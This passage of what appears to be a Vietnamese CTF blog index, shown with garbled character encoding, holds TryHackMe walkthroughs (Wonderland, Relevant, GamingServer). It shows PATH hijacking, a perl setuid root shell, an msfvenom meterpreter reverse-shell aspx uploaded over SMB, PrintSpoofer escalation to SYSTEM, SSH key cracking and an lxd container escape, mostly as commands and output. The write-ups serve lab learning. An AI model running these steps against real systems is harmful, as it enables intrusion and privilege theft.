nÃ y náº±m á»Ÿ Ä‘Ã¢u. TÃ´i hoÃ n toÃ n cÃ³ thá»ƒ táº¡o 1 file thá»±c thi cÃ³ tÃªn date bÃªn trong thÆ° má»¥c /tmp\n#!/bin/bash echo \u0026#34;\u0026#34; /bin/bash Thay Ä‘á»•i quyá»n cho file báº±ng chmod +x /tmp/date vÃ  thÃªm path /tmp vÃ o Ä‘áº§u biáº¿n PATH Ä‘á»ƒ khi cháº¡y file teaParty nÃ³ sáº½ nháº­n path /tmp Ä‘áº§u tiÃªn.\nrabbit@wonderland:/home/rabbit$ chmod +x /tmp/date rabbit@wonderland:/home/rabbit$ export PATH=/tmp:$PATH rabbit@wonderland:/home/rabbit$ echo $PATH /tmp:/tmp:/home/rabbit:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin rabbit@wonderland:/home/rabbit$ ./teaParty Welcome to the tea party! The Mad Hatter will be here soon. Probably by 1337 hatter@wonderland:/home/rabbit$ hatter@wonderland:/home/hatter$ ls password.txt Váº­y lÃ  tÃ´i cÃ³ password cá»§a user hatter. Thá»­ login ssh báº±ng user nÃ y. Tuy nhiÃªn thá»­ cáº£ sudo -l, crontab hay tÃ¬m file do hatter sá»Ÿ há»¯u Ä‘á»u khÃ´ng cÃ³ káº¿t quáº£. Äáº¿n bÃ¢y giá» thÃ¬ pháº£i dÃ¹ng Ä‘áº¿n linpeas. Táº¡o http server tá»« mÃ¡y local vÃ  táº£i file lÃªn thÃ´i. Sau Ä‘Ã³ Ä‘á»•i quyá»n cho file vÃ  Ä‘á»ƒ nÃ³ lÃ m pháº§n viá»‡c cá»§a mÃ¬nh.\nhatter@wonderland:~$ wget http://10.18.3.74:9001/linpeas.sh --2022-08-11 10:05:56-- http://10.18.3.74:9001/linpeas.sh Connecting to 10.18.3.74:9001... connected. HTTP request sent, awaiting response... 200 OK Length: 777018 (759K) [text/x-sh] Saving to: â€˜linpeas.shâ€™ linpeas.sh 100%[====================================================================================================\u0026gt;] 758.81K 141KB/s in 5.4s 2022-08-11 10:06:02 (141 KB/s) - â€˜linpeas.shâ€™ saved [777018/777018] hatter@wonderland:~$ chmod +x linpeas.sh hatter@wonderland:~$ ./linpeas.sh Cuá»‘i cÃ¹ng thÃ¬ tÃ´i cÅ©ng tÃ¬m Ä‘Æ°á»£c thá»© mÃ¬nh cáº§n\nFiles with capabilities (limited to 50): /usr/bin/perl5.26.1 = cap_setuid+ep /usr/bin/mtr-packet = cap_net_raw+ep /usr/bin/perl = cap_setuid+ep hatter@wonderland:~$ ll /usr/bin/perl /usr/bin/perl5.26.1 -rwxr-xr-- 2 root hatter 2097720 Nov 19 2018 /usr/bin/perl* -rwxr-xr-- 2 root hatter 2097720 Nov 19 2018 /usr/bin/perl5.26.1* Äiá»u nÃ y cÃ³ nghÄ©a lÃ  user hatter cÃ³ quyá»n thá»±c thi cÅ©ng nhÆ° quáº£n lÃ½ nÃ³. Thá»­ vÃ o GTFOBins Ä‘á»ƒ tÃ¬m perl vá»›i Capabilities.\nhatter@wonderland:~$ /usr/bin/perl -e \u0026#39;use POSIX qw(setuid); POSIX::setuid(0); exec \u0026#34;/bin/sh\u0026#34;;\u0026#39; # id uid=0(root) gid=1003(hatter) groups=1003(hatter) # ls /root user.txt Cuá»‘i cÃ¹ng lÃ  láº¥y user flag vÃ  root flag thÃ¬ náº±m trong thÆ° má»¥c alice.\nConclusion # Tá»•ng káº¿t vá» bÃ i thÃ¬ pháº§n thu tháº­p thÃ´ng tin cÅ©ng khÃ´ng cÃ³ gÃ¬ nhiá»u vÃ  táº­p trung chá»§ yáº¿u vÃ o viá»‡c nÃ¢ng cao ká»¹ nÄƒng leo thang Ä‘áº·c quyá»n trÃªn linux. VÃ  tÃ´i biáº¿t thÃªm 1 cÃ¡ch khai thÃ¡c lá»—i má»›i thÃ´ng qua cÃ¡c thÆ° viá»‡n python - Python Library Hijacking. NÃ³ sáº½ ráº¥t há»¯u Ã­ch vá»›i cÃ¡c tá»‡p lá»‡nh python Ä‘Æ°á»£c cháº¡y vá»›i Ä‘áº·c quyá»n cao.\nNgoÃ i ra, trong khi tÃ¬m hiá»ƒu vá» SUID vÃ  GUID, tÃ´i biáº¿t thÃªm Ä‘Æ°á»£c 1 kiá»ƒu phÃ¢n quyá»n ná»¯a lÃ  sticky bit. Trong 1 vÃ i trÆ°á»ng há»£p, nÃ³ cÅ©ng khÃ¡ há»¯u Ã­ch Ä‘á»ƒ khai thÃ¡c trong viá»‡c Ä‘á»c hay ghi file vá»›i Ä‘áº·c quyá»n Ä‘Æ°á»£c chá»‰ Ä‘á»‹nh cá»¥ thá»ƒ.\nÄá»c thÃªm: Sticky bit\nÄá»c thÃªm: Linux Capabilities\n","date":"30 November 2021","externalUrl":null,"permalink":"/ctf/tryhackme/wonderland/","section":"Ctf","summary":"","title":"Tryhackme - Wonderland","type":"ctf"},{"content":"","date":"26 November 2021","externalUrl":null,"permalink":"/tags/msfvenom/","section":"Tags","summary":"","title":"Msfvenom","type":"tags"},{"content":"","date":"26 November 2021","externalUrl":null,"permalink":"/tags/printspoofer/","section":"Tags","summary":"","title":"Printspoofer","type":"tags"},{"content":"HÃ´m nay tÃ´i sáº½ giáº£i CTF Tryhackme - Relevant\nReconnaissance # Váº«n nhÆ° thÃ´ng thÆ°á»ng, viá»‡c Ä‘áº§u tiÃªn cáº§n lÃ m lÃ  quÃ©t cÃ¡c cá»•ng Ä‘ang má»Ÿ cá»§a ip má»¥c tiÃªu.\nPORT STATE SERVICE REASON VERSION 80/tcp open http syn-ack Microsoft IIS httpd 10.0 |_http-server-header: Microsoft-IIS/10.0 |_http-title: IIS Windows Server | http-methods: | Supported Methods: OPTIONS TRACE GET HEAD POST |_ Potentially risky methods: TRACE 135/tcp open msrpc syn-ack Microsoft Windows RPC 139/tcp open netbios-ssn syn-ack Microsoft Windows netbios-ssn 445/tcp open microsoft-ds syn-ack Windows Server 2016 Standard Evaluation 14393 microsoft-ds 3389/tcp open ms-wbt-server syn-ack Microsoft Terminal Services | ssl-cert: Subject: commonName=Relevant | Issuer: commonName=Relevant | Public Key type: rsa | Public Key bits: 2048 | Signature Algorithm: sha256WithRSAEncryption | Not valid before: 2022-08-08T07:29:30 | Not valid after: 2023-02-07T07:29:30 | MD5: 58fd 9021 e69c 979c b9b2 83b3 5b20 59e1 | SHA-1: 5f3c 2cb7 9ff0 b109 443b 9813 6fad 5768 a5c8 03e4 | -----BEGIN CERTIFICATE----- | MIIC1DCCAbygAwIBAgIQI/Rvv/LKG6hAIETCfD4qYzANBgkqhkiG9w0BAQsFADAT | MREwDwYDVQQDEwhSZWxldmFudDAeFw0yMjA4MDgwNzI5MzBaFw0yMzAyMDcwNzI5 | MzBaMBMxETAPBgNVBAMTCFJlbGV2YW50MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8A | MIIBCgKCAQEAridw40n6SvFc+v8JUCzyg/kr4MHV6PuHxOSUa0ULDlwkoSYBJeWa | jouI1vOzfKyZe9t6J6xiyaG3cMu7gBswCVemW3JaUSq3M0KpJTXMGZq/UGU87TxD | TIsgEwVxX8FyzANIDk1a4st+6xFQeES33zXBlsGbVidxW7Shh3hPAKa5tt/u1xYO | md9Wg+amFM1mv+afZJ4LSEt7qfS35sqoOIqER0Na2HXS5CfcfRUc34QfOtPbaGsd | 3zJfFh6idnIxWrWIMBzt5JJuG286zttjM1jZWIUuevA2kIgIlDf/5Pngnodc2sE4 | G7h24ATGycCUaymwpq4ocB7B3idm6ZnqpQIDAQABoyQwIjATBgNVHSUEDDAKBggr | BgEFBQcDATALBgNVHQ8EBAMCBDAwDQYJKoZIhvcNAQELBQADggEBAKrQPuiiz++z | ufha6p579FYmyeHrzk1vDW9paLmFt3ic0E6E5GP25/NfwlObSmXwbr+1seFJf00Z | SqF2u730F44xdTGzT11gLub69fcXRFerO251m5XwabPmhsHehs0jTYd85wbU2u4t | hGa+U8WZCFRPk+mAIkTOB3yMRjQEG0FQzQZEL/7BX1/RPdgWhB0eDeNoYEMw64wH | MT0+4/BTFwxiRqylzbExqec8bxTN58KGIDGemMHYYyBGMlg4Wmb+t+dXPEIBeCOf | +/2+Kr2+63Hcfs9Byl79YftuK8LyXYkFfBRShNvoSi/WukJa/qCyQfUvAGcZC2QW | rpp8f0Bu6ac= |_-----END CERTIFICATE----- |_ssl-date: 2022-08-09T07:35:45+00:00; -12s from scanner time. | rdp-ntlm-info: | Target_Name: RELEVANT | NetBIOS_Domain_Name: RELEVANT | NetBIOS_Computer_Name: RELEVANT | DNS_Domain_Name: Relevant | DNS_Computer_Name: Relevant | Product_Version: 10.0.14393 |_ System_Time: 2022-08-09T07:35:08+00:00 49663/tcp open http syn-ack Microsoft IIS httpd 10.0 |_http-server-header: Microsoft-IIS/10.0 |_http-title: IIS Windows Server | http-methods: | Supported Methods: OPTIONS TRACE GET HEAD POST |_ Potentially risky methods: TRACE 49667/tcp open msrpc syn-ack Microsoft Windows RPC 49669/tcp open msrpc syn-ack Microsoft Windows RPC Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: 1h23m48s, deviation: 3h07m51s, median: -12s | smb2-security-mode: | 3.1.1: |_ Message signing enabled but not required | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-time: | date: 2022-08-09T07:35:07 |_ start_date: 2022-08-09T07:30:05 | smb-os-discovery: | OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3) | Computer name: Relevant | NetBIOS computer name: RELEVANT\\x00 | Workgroup: WORKGROUP\\x00 |_ System time: 2022-08-09T00:35:08-07:00 | p2p-conficker: | Checking for Conficker.C or higher... | Check 1 (port 58498/tcp): CLEAN (Timeout) | Check 2 (port 13141/tcp): CLEAN (Timeout) | Check 3 (port 46642/udp): CLEAN (Timeout) | Check 4 (port 13285/udp): CLEAN (Timeout) |_ 0/4 checks are positive: Host is CLEAN or ports are blocked TÃ´i cÃ³ 1 Window server á»Ÿ Ä‘Ã¢y vá»›i port 139 vÃ  445 cá»§a SMB service. Thá»­ ghÃ© qua 2 port nÃ y trÆ°á»›c xem cÃ³ khai thÃ¡c Ä‘Æ°á»£c thÃ´ng tin gÃ¬ khÃ´ng.\nâ”Œâ”€â”€(neoã‰¿kali)-[~] â””â”€$ smbclient -L \\\\\\\\10.10.84.34 Password for [WORKGROUP\\neo]: Sharename Type Comment --------- ---- ------- ADMIN$ Disk Remote Admin C$ Disk Default share IPC$ IPC Remote IPC nt4wrksv Disk Reconnecting with SMB1 for workgroup listing. do_connect: Connection to 10.10.84.34 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND) Unable to connect with SMB1 -- no workgroup available ChÃºng ta cÃ³ 1 folder tÃªn nt4wrksv. Thá»­ truy cáº­p vÃ o thÆ° má»¥c nÃ y vÃ  tÃ´i cÃ³ 1 file password.\nâ”Œâ”€â”€(neoã‰¿kali)-[~] â””â”€$ smbclient \\\\\\\\10.10.84.34\\\\nt4wrksv Password for [WORKGROUP\\neo]: Try \u0026#34;help\u0026#34; to get a list of possible commands. smb: \\\u0026gt; smb: \\\u0026gt; dir . D 0 Sat Jul 25 17:46:04 2020 .. D 0 Sat Jul 25 17:46:04 2020 passwords.txt A 98 Sat Jul 25 11:15:33 2020 7735807 blocks of size 4096. 4944824 blocks available smb: \\\u0026gt; get passwords.txt getting file \\passwords.txt of size 98 as passwords.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec) Láº¥y nÃ³ vá» vÃ  xem bÃªn trong cÃ³ gÃ¬ nÃ o.\nâ”Œâ”€â”€(neoã‰¿kali)-[~] â””â”€$ cat passwords.txt [User Passwords - Encoded] Qm9iIC0gIVBAJCRXMHJEITEyMw== QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk TÃ´i hay sá»­ dá»¥ng web nÃ y Ä‘á»ƒ decrypt nhá»¯ng base phá»• biáº¿n nhÆ° 16, 32, 64, v.v.. Vá»›i dÃ²ng Ä‘áº§u tiÃªn tÃ´i cÃ³ user-pass cá»§a Bob vÃ  dÃ²ng thá»© 2 lÃ  user-pass cá»§a Bill.\nDo Ä‘Ã¢y lÃ  window server nÃªn tÃ´i sáº½ thá»­ táº¡o Meterpreter payload vÃ  Ä‘áº©y nÃ³ vÃ o share file:\nmsfvenom -p windows/x64/meterpreter_reverse_tcp lhost=10.18.3.74 lport=2402 -f aspx -o shell.aspx\ná» Ä‘Ã¢y tÃ´i sá»­ dá»¥ng msfvenom vá»›i:\n-p: lá»±a chá»n payload muá»‘n Ä‘áº©y\nlhost vÃ  lport lÃ  ip litsener cá»§a mÃ¡y tÃ´i\n-f: chá»n Ä‘á»‹nh dáº¡ng file sáº½ xuáº¥t ra\n-o: táº¡o file vá»›i tÃªn shell.aspx\nChá» 1 lÃºc Ä‘á»ƒ file táº¡o thÃ nh cÃ´ng\nsmb: \\\u0026gt; put /home/neo/shell.aspx shell.aspx putting file /home/neo/shell.aspx as \\shell.aspx (296.6 kb/s) (average 296.6 kb/s) smb: \\\u0026gt; dir . D 0 Tue Aug 9 05:36:44 2022 .. D 0 Tue Aug 9 05:36:44 2022 passwords.txt A 98 Sat Jul 25 11:15:33 2020 shell.aspx A 1013006 Tue Aug 9 05:36:47 2022 7735807 blocks of size 4096. 4912865 blocks available Váº­y lÃ  up shell thÃ nh cÃ´ng. Táº¡o listener vá»›i Metasploit\nmsf6 \u0026gt; use exploit/multi/handler [*] Using configured payload generic/shell_reverse_tcp msf6 exploit(multi/handler) \u0026gt; set payload windows/x64/meterpreter_reverse_tcp payload =\u0026gt; windows/x64/meterpreter_reverse_tcp Thiáº¿t láº­p LHOSTS vÃ  LPORT giá»‘ng vá»›i trong payload vá»«a táº¡o\nmsf6 exploit(multi/handler) \u0026gt; run [*] Started reverse TCP handler on 10.18.3.74:2402 Sau Ä‘Ã³ táº¡o request Ä‘áº¿n web Ä‘á»ƒ má»Ÿ file shell vá»«a up lÃªn server. TÃ´i cÃ³ 2 port tcp á»Ÿ Ä‘Ã¢y lÃ  80 vÃ  49663, sau khi thá»­ cáº£ 2 thÃ¬ tÃ´i cÃ³ curl http://10.10.189.211:49663/nt4wrksv/shell.aspx\nmeterpreter \u0026gt; getuid Server username: IIS APPPOOL\\DefaultAppPool meterpreter \u0026gt; shell Process 2116 created. Channel 1 created. Microsoft Windows [Version 10.0.14393] (c) 2016 Microsoft Corporation. All rights reserved. c:\\windows\\system32\\inetsrv\u0026gt; VÃ  tÃ´i tÃ¬m Ä‘Æ°á»£c user flag trong user Bob\nc:\\Users\\Bob\\Desktop\u0026gt;dir dir Volume in drive C has no label. Volume Serial Number is AC3C-5CB5 Directory of c:\\Users\\Bob\\Desktop 07/25/2020 02:04 PM \u0026lt;DIR\u0026gt; . 07/25/2020 02:04 PM \u0026lt;DIR\u0026gt; .. 07/25/2020 08:24 AM 35 user.txt 1 File(s) 35 bytes 2 Dir(s) 20,255,997,952 bytes free Privilege escalation # TÃ´i check thá»­ xem cÃ³ cÃ¡c Ä‘áº·c quyá»n nÃ o khÃ´ng\nmeterpreter \u0026gt; getprivs Enabled Process Privileges ========================== Name ---- SeAssignPrimaryTokenPrivilege SeAuditPrivilege SeChangeNotifyPrivilege SeCreateGlobalPrivilege SeImpersonatePrivilege SeIncreaseQuotaPrivilege SeIncreaseWorkingSetPrivilege TÃ´i Ä‘á»ƒ Ã½ cÃ³ SeImpersonatePrivilege, tÃ´i sáº½ dÃ¹ng payload nÃ y Ä‘á»ƒ thá»­ láº¥y quyá»n SYSTEM.\nÄáº§u tiÃªn táº¡o file .exe\nâ”Œâ”€â”€(neoã‰¿kali)-[~/PrintSpoofer/PrintSpoofer] â””â”€$ sudo gcc PrintSpoofer.cpp -o PrintSpoofer.exe [sudo] password for neo: PrintSpoofer.cpp:3:10: fatal error: Windows.h: No such file or directory 3 | #include \u0026lt;Windows.h\u0026gt; | ^~~~~~~~~~~ compilation terminated. CÃ³ váº» nhÆ° khÃ´ng cháº¡y Ä‘Æ°á»£c báº±ng terminal, tÃ´i pháº£i táº£i vscode vá» Ä‘á»ƒ build file nÃ y. NhÆ°ng tÃ´i nháº­n ra Ä‘á»ƒ build Ä‘Æ°á»£c thÃ¬ tÃ´i láº¡i pháº£i táº£i Vs Studio vÃ  cÃ i thÃªm C++, chá»‰ tá»«ng áº¥y thá»© Ä‘Ã£ lÃ m tÃ´i muá»‘n tá»« bá» rá»“i. \u0026#x1f62a;\nMay máº¯n lÃ  Ä‘Ã£ cÃ³ ngÆ°á»i lÃ m thay tÃ´i viá»‡c Ä‘Ã³ up nÃ³ lÃªn github, vÃ  nÃ³ á»Ÿ Ä‘Ã¢y. BÃ¢y giá» thÃ¬ chá»‰ cáº§n clone nÃ³ vá» vÃ  Ä‘áº©y nÃ³ vÃ o mÃ¡y má»¥c tiÃªu.\nâ”Œâ”€â”€(neoã‰¿kali)-[~/printspoofer] â””â”€$ smbclient \\\\\\\\10.10.114.141\\\\nt4wrksv Password for [WORKGROUP\\neo]: Try \u0026#34;help\u0026#34; to get a list of possible commands. smb: \\\u0026gt; put PrintSpoofer.exe putting file PrintSpoofer.exe as \\PrintSpoofer.exe (29.4 kb/s) (average 29.4 kb/s) smb: \\\u0026gt; dir . D 0 Wed Aug 10 00:03:19 2022 .. D 0 Wed Aug 10 00:03:19 2022 passwords.txt A 98 Sat Jul 25 11:15:33 2020 PrintSpoofer.exe A 27136 Wed Aug 10 00:03:19 2022 shell.aspx A 1013006 Tue Aug 9 22:00:27 2022 7735807 blocks of size 4096. 5158914 blocks available Cháº¡y láº¡i meterpreter payload vÃ  thá»±c hiá»‡n láº¡i lá»‡nh curl, sau Ä‘Ã³ tÃ¬m xem file exe vá»«a Ä‘áº©y lÃªn á»Ÿ Ä‘Ã¢u.\nc:\\\u0026gt;dir \u0026#34;\\PrintSpoofer.exe\u0026#34; /s dir \u0026#34;\\PrintSpoofer.exe\u0026#34; /s Volume in drive C has no label. Volume Serial Number is AC3C-5CB5 Directory of c:\\inetpub\\wwwroot\\nt4wrksv BÃ¢y giá» thÃ¬ láº¥y quyá»n admin thÃ´i.\nc:\\inetpub\\wwwroot\\nt4wrksv\u0026gt;PrintSpoofer.exe -i -c cmd PrintSpoofer.exe -i -c cmd [+] Found privilege: SeImpersonatePrivilege [+] Named pipe listening... [+] CreateProcessAsUser() OK Microsoft Windows [Version 10.0.14393] (c) 2016 Microsoft Corporation. All rights reserved. C:\\Windows\\system32\u0026gt;whoami whoami nt authority\\system C:\\Windows\\system32\u0026gt;cd \\users\\administrator\\desktop cd \\users\\administrator\\desktop C:\\Users\\Administrator\\Desktop\u0026gt;dir dir Volume in drive C has no label. Volume Serial Number is AC3C-5CB5 Directory of C:\\Users\\Administrator\\Desktop 07/25/2020 08:24 AM \u0026lt;DIR\u0026gt; . 07/25/2020 08:24 AM \u0026lt;DIR\u0026gt; .. 07/25/2020 08:25 AM 35 root.txt 1 File(s) 35 bytes 2 Dir(s) 21,130,473,472 bytes free Conclusion # TÃ´i chÆ°a cÃ³ nhiá»u kiáº¿n thá»©c vá» window nÃªn thá»­ thÃ¡ch nÃ y thá»±c sá»± Ä‘Ã£ lÃ m khÃ³ tÃ´i Ä‘áº·c biá»‡t lÃ  pháº§n leo thang Ä‘áº·c quyá»n. TÃ´i sáº½ pháº£i há»c thÃªm vÃ  sáº½ lÃ m thÃªm cÃ¡c CTF cá»§a Windows.\nÄá»c thÃªm: SMB Enumeration \u0026amp; Exploitation \u0026amp; Hardening\nÄá»c thÃªm: Window Privilege Escalation\n","date":"26 November 2021","externalUrl":null,"permalink":"/ctf/tryhackme/relevant/","section":"Ctf","summary":"","title":"Tryhackme - Relevant","type":"ctf"},{"content":"HÃ´m nay tÃ´i sáº½ giáº£i CTF Tryhackme - GamingServer\nReconnaissance # Váº«n nhÆ° thÃ´ng thÆ°á»ng, viá»‡c Ä‘áº§u tiÃªn lÃ  quÃ©t cá»•ng.\nPORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 34:0e:fe:06:12:67:3e:a4:eb:ab:7a:c4:81:6d:fe:a9 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCrmafoLXloHrZgpBrYym3Lpsxyn7RI2PmwRwBsj1OqlqiGiD4wE11NQy3KE3Pllc/C0WgLBCAAe+qHh3VqfR7d8uv1MbWx1mvmVxK8l29UH1rNT4mFPI3Xa0xqTZn4Iu5RwXXuM4H9OzDglZas6RIm6Gv+sbD2zPdtvo9zDNj0BJClxxB/SugJFMJ+nYfYHXjQFq+p1xayfo3YIW8tUIXpcEQ2kp74buDmYcsxZBarAXDHNhsEHqVry9I854UWXXCdbHveoJqLV02BVOqN3VOw5e1OMTqRQuUvM5V4iKQIUptFCObpthUqv9HeC/l2EZzJENh+PmaRu14izwhK0mxL | 256 49:61:1e:f4:52:6e:7b:29:98:db:30:2d:16:ed:f4:8b (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEaXrFDvKLfEOlKLu6Y8XLGdBuZ2h/sbRwrHtzsyudARPC9et/zwmVaAR9F/QATWM4oIDxpaLhA7yyh8S8m0UOg= | 256 b8:60:c4:5b:b7:b2:d0:23:a0:c7:56:59:5c:63:1e:c4 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOLrnjg+MVLy+IxVoSmOkAtdmtSWG0JzsWVDV2XvNwrY 80/tcp open http syn-ack Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: House of danak | http-methods: |_ Supported Methods: GET POST OPTIONS HEAD Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Chá»‰ cÃ³ 2 port nÃªn tÃ´i sáº½ báº¯t Ä‘áº§u vá»›i web server. CÃ³ váº» Ä‘Ã¢y lÃ  trang web cá»§a 1 tá»±a game, tÃ´i thá»­ check qua cÃ¡c path Ä‘Æ¡n giáº£n thÃ¬ tÃ´i tÃ¬m Ä‘Æ°á»£c /robots.txt vÃ  bÃªn trong Ä‘Ã³ lÃ  /uploads.\nTÃ´i cÃ³ 1 file dict lÃ  1 list cÃ¡c tá»« thÃ¬ cÃ³ thá»ƒ sáº½ Ä‘Æ°á»£c dÃ¹ng lÃ m wordlist Ä‘á»ƒ bruteforce, 1 file txt vÃ  1 bá»©c áº£nh. CÅ©ng khÃ´ng cÃ³ gÃ¬ Ä‘áº·c biá»‡t á»Ÿ Ä‘Ã¢y. Thá»­ dÃ¹ng dirsearch Ä‘á»ƒ check xem cÃ²n path nÃ o ná»¯a khÃ´ng, tÃ´i tÃ¬m Ä‘Æ°á»£c /secret/. Trong nÃ y cÃ³ 1 file rsa key. TÃ´i cÃ³ thá»ƒ dÃ¹ng key nÃ y Ä‘á»ƒ login ssh chÄƒng. NhÆ°ng hiá»‡n táº¡i tÃ´i chÆ°a cÃ³ username nÃ o.\nLoanh quanh web 1 lÃºc thÃ¬ tÃ´i Ä‘Ã£ tÃ¬m Ä‘Æ°á»£c 1 cÃ¡i tÃªn trong source web.\n\u0026lt;!-- john, please add some actual content to the site! lorem ipsum is horrible to look at. --\u0026gt;\nTuy nhiÃªn, khi thá»­ login ssh tÃ´i Ä‘Æ°á»£c yÃªu cáº§u pháº£i cÃ³ passphrase. VÃ¬ váº­y tÃ´i sáº½ dÃ¹ng John-the-Ripper Ä‘á»ƒ crack passphrase tá»« key trÃªn.\nSSH # â”Œâ”€â”€(neoã‰¿kali)-[~] â””â”€$ ssh2john key \u0026gt; id_rsa.hash â”Œâ”€â”€(neoã‰¿kali)-[~] â””â”€$ john --wordlist=dict.lst id_rsa.hash Using default input encoding: UTF-8 Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64]) Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes Cost 2 (iteration count) is 1 for all loaded hashes Will run 4 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status ****** (key) 1g 0:00:00:00 DONE (2022-08-04 22:54) 5.000g/s 1115p/s 1115c/s 1115C/s 2003 Login ssh vÃ  tÃ´i cÃ³ user flag\njohn@exploitable:~$ ls user.txt Privilege escalation # john@exploitable:~$ id uid=1000(john) gid=1000(john) groups=1000(john),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd) TÃ´i Ä‘á»ƒ Ã½ user John náº±m trong group lxd, Ä‘Ã¢y cÅ©ng lÃ  1 exploit khÃ¡ hay nhÆ°ng trÆ°á»›c háº¿t tÃ´i sáº½ thá»­ cÃ¡c exploit phá»• biáº¿n trÆ°á»›c, náº¿u khÃ´ng thá»ƒ thÃ¬ tÃ´i sáº½ quay láº¡i lxd. Tuy nhiÃªn sau 1 lÃºc loay hoay vá»›i sudo -l hay tÃ¬m SUID Ä‘á»u khÃ´ng cÃ³ káº¿t quáº£, tÃ´i sáº½ quay láº¡i lxd.\nlxd vá» báº£n cháº¥t thÃ¬ tÆ°Æ¡ng tá»± nhÆ° Docker tuy nhiÃªn nÃ³ cÃ³ thá»ƒ chá»©a Ä‘Æ°á»£c cáº£ há»‡ Ä‘iá»u hÃ nh trong 1 container. VÃ  vá»›i lxd tÃ´i sáº½ lÃ m theo hÆ°á»›ng dáº«n á»Ÿ Ä‘Ã¢y\nÄáº§u tiÃªn táº£i build-alpine:\nâ”Œâ”€â”€(neoã‰¿kali)-[~] â””â”€$ wget https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine --2022-08-05 03:03:48-- https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.110.133, 185.199.108.133, 185.199.109.133, ... Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.110.133|:443... connected. HTTP request sent, awaiting response... 200 OK Length: 8060 (7.9K) [text/plain] Saving to: â€˜build-alpineâ€™ build-alpine 100%[====================================================================================================\u0026gt;] 7.87K --.-KB/s in 0.001s 2022-08-05 03:03:48 (6.13 MB/s) - â€˜build-alpineâ€™ saved [8060/8060] Sau Ä‘Ã³ build container:\nâ”Œâ”€â”€(rootã‰¿kali)-[/home/neo] â””â”€# ./build-alpine Determining the latest release... v3.16 Using static apk from http://dl-cdn.alpinelinux.org/alpine//v3.16/main/x86_64 Downloading apk-tools-static-2.12.9-r3.apk tar: Ignoring unknown extended header keyword \u0026#39;APK-TOOLS.checksum.SHA1\u0026#39; tar: Ignoring unknown extended header keyword \u0026#39;APK-TOOLS.checksum.SHA1\u0026#39; Downloading alpine-keys-2.4-r1.apk ... Sau khi build xong thÃ¬ tÃ´i sáº½ cÃ³ Ä‘Æ°á»£c 1 container nhÆ° tháº¿ nÃ y:\nâ”Œâ”€â”€(rootã‰¿kali)-[/home/neo] â””â”€# ll total 4228 -rw-r--r-- 1 root root 3203668 Aug 5 03:07 alpine-v3.16-x86_64-20220805_0307.tar.gz Viá»‡c tiáº¿p theo lÃ  táº¡o http server báº±ng python Ä‘á»ƒ upload nÃ³ lÃªn remote machine:\njohn@exploitable:~$ wget http://10.18.3.74:9000/alpine-v3.16-x86_64-20220805_0307.tar.gz --2022-08-05 07:10:52-- http://10.18.3.74:9000/alpine-v3.16-x86_64-20220805_0307.tar.gz Connecting to 10.18.3.74:9000... connected. HTTP request sent, awaiting response... 200 OK Length: 3203668 (3.1M) [application/gzip] Saving to: â€˜alpine-v3.16-x86_64-20220805_0307.tar.gzâ€™ alpine-v3.16-x86_64-20220805_0307.tar.gz 100%[====================================================================================================\u0026gt;] 3.05M 614KB/s in 5.5s 2022-08-05 07:10:58 (571 KB/s) - â€˜alpine-v3.16-x86_64-20220805_0307.tar.gzâ€™ saved [3203668/3203668] Sau Ä‘Ã³ thÃ¬ thÃªm image vÃ o lxd vÃ  thá»­ kiá»ƒm tra xem lxd Ä‘Ã£ nháº­n image chÆ°a:\njohn@exploitable:/var/tmp$ lxc image import alpine-v3.16-x86_64-20220805_0307.tar.gz --alias myimage Image imported with fingerprint: 963724185ee69c3baf96c05771e0e4e0fdcbb4b75bed127ab48877a7533ac0b6 john@exploitable:/var/tmp$ lxc image list +---------+--------------+--------+-------------------------------+--------+--------+-----------------------------+ | ALIAS | FINGERPRINT | PUBLIC | DESCRIPTION | ARCH | SIZE | UPLOAD DATE | +---------+--------------+--------+-------------------------------+--------+--------+-----------------------------+ | myimage | 963724185ee6 | no | alpine v3.16 (20220805_03:07) | x86_64 | 3.06MB | Aug 5, 2022 at 7:45am (UTC) | +---------+--------------+--------+-------------------------------+--------+--------+-----------------------------+ Sau Ä‘Ã³ lÃ m theo cÃ¡c cÃ¢u lá»‡nh nhÆ° exploit bÃªn trÃªn:\njohn@exploitable:/var/tmp$ lxc init myimage ignite -c security.privileged=true Creating ignite john@exploitable:/var/tmp$ lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true Device mydevice added to ignite john@exploitable:/var/tmp$ lxc start ignite john@exploitable:/var/tmp$ lxc exec ignite /bin/sh ~ # id uid=0(root) gid=0(root) ~ # find / -type f -name root.txt 2\u0026gt;/dev/null /mnt/root/root/root.txt Tá»•ng káº¿t # Qua bÃ i nÃ y, tÃ´i biáº¿t thÃªm vá» lxd container vÃ  cÃ¡ch leo thang Ä‘áº·c quyá»n vá»›i nÃ³. VÃ  nÃ³ cÅ©ng ráº¥t 